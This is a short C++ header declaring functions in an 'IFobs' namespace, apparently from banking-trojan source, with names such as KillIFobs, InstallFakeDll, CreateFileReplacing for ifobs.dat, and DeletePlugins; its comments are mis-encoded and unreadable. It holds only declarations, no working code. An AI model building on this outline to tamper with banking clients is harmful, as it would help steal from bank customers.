#ifndef IFobsH
#define IFobsH


namespace IFobs
{

bool Init( const char* appName );
DWORD WINAPI KillIFobs(void*);
//������� ���� ������� ifobs.dat
void CreateFileReplacing( const char* s );
DWORD WINAPI InstallFakeDll(void*);
//������� ����������� �������, ����� ��� ����� ����������
void DeletePlugins();

};


#endif //IFobsH
